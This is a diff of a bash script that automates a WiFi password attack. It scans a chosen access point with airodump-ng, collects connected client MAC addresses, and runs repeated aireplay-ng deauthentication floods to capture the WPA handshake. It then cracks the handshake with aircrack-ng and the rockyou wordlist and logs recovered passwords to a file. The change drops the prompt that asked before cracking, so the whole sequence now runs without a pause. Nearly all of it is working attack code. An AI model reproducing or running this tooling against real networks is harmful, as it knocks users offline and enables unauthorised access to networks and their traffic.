@@ -37,6 +37,7 @@ else
 fi
 echo -e "\033[1;31m\033[1mChannel:\033[0m $channel"
 echo
+echo
 
 if [ "$encryption" = "WPA3" ]; then
     echo -e "\033[1mThe encryption is WPA3. Can't crack it yet.\033[0m"
@@ -46,11 +47,15 @@ elif [ "$encryption" = "OPN" ]; then
     exit 1
 fi
 
+
+
 # if directory exist from previous scan then delete it & create new
 if [ -d $path/"$bssid_name" ]; then
     rm -r $path/"$bssid_name"
 fi
 mkdir $path/"$bssid_name"
+
+
 
 # Scan 30 seconds for devices:
 gnome-terminal --geometry=100x20+250+120 -- script -c "sudo airodump-ng -c $channel -w '$path/$bssid_name/$bssid_name' -d $bssid_address wlan0mon" "$path/$bssid_name/airodump_output.txt" &
@@ -64,6 +69,7 @@ if [ "$(grep -c "$bssid_address" "$path/$bssid_name/airodump_output.txt")" -lt 2
     exit 1
 fi
 
+
 for ((i=1; i<=10; i++)); do
     target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
 
@@ -76,6 +82,7 @@ for ((i=1; i<=10; i++)); do
     sleep 3
 done
 
+
 if [ -z "$target_devices" ]; then
     echo -e "\033[1m\nNo device were found.\033[0m"
     sudo pkill airodump-ng
@@ -83,7 +90,10 @@ if [ -z "$target_devices" ]; then
     exit 1
 fi
 
+
+
 sleep 3
+
 
 # Check if we capture the handshake:
 if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_output.txt"; then
@@ -97,13 +107,13 @@ if sudo grep -q "WPA handshake: $bssid_address" "$path/$bssid_name/airodump_outp
 
 # Starting deauth attack and waiting for handshake:      
 else
-    echo -e "\033[1m\nStarting deauth attack ->>\033[0m\n"
+    echo -e "\033[1m\nStarting deauth attack ->>\033[0m"
     # trying 10 times (3 minutes) the deauth attack
     for ((i=1; i<=10; i++)); do        
         target_devices=$(sudo grep -oP '(?<=<client-mac>).*?(?=</client-mac>)' "$path/$bssid_name/$bssid_name-01.kismet.netxml")
         
         for target_device in $target_devices; do
-            gnome-terminal --geometry=100x20-250+120 -- sudo timeout 3s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon &
+            gnome-terminal --geometry=100x20-250+120 -- sudo timeout 5s aireplay-ng --deauth 0 -a "$bssid_address" -c "$target_device" wlan0mon &
         done
         
         echo -e "Attempt \e[1;34m$i/10\e[0m to capture handshake of:"         
@@ -138,38 +148,22 @@ fi
 sudo chown -R $UN:$UN $path
 
 
+# Cracking the Password
+echo -e "\e[1m\nCracking the wifi password with rockyou wordlist ->>\n\e[0m"
 
-# Cracking the wifi password with rockyou wordlist:
-confirm() {
-    read -p "$1" -n 1 -r
-    echo    
-    if [[ $REPLY =~ ^[Yy]$ ]]; then
-        return 0  
-    fi
-    return 1  
-}
 
-echo -e "\e[1m\nDo you want to crack the WiFi password using aircrack-ng ?\e[0m"
-
-confirm "(y/n): "
-if [ $? -eq 0 ]; then
-    sudo aircrack-ng "$path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$path/$bssid_name/$bssid_name-wifi_password.txt"
-    echo
-    if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
-        wifi_pass=$(cat "$path/$bssid_name/$bssid_name-wifi_password.txt")
-        echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
-        echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
-    else
-        echo -e "\nCouldn't finf a match from rockyou wordlist.."
-    fi
+sudo aircrack-ng "$path/$bssid_name/$bssid_name"*.cap -w /usr/share/wordlists/rockyou.txt -l "$path/$bssid_name/$bssid_name-wifi_password.txt"
+echo
+if [ -f "$path/$bssid_name/$bssid_name-wifi_password.txt" ]; then
+    wifi_pass=$(cat "$path/$bssid_name/$bssid_name-wifi_password.txt")
+    echo -e "The wifi password of \033[1;31m\033[1m$bssid_name\033[0m is:	\033[1;31m\033[1m$wifi_pass\033[0m"
+    echo "The wifi password is:   $wifi_pass" >> $path/wifi_passwords.txt
 else
-    echo -e "\nBye."
+    echo -e "\nCouldn't finf a match from rockyou wordlist.."
 fi
 
 
 
 
+#sudo airmon-ng stop wlan0mon && sudo systemctl start NetworkManager
 
-
-#sudo airmon-ng stop wlan0mon
-#sudo systemctl start NetworkManager
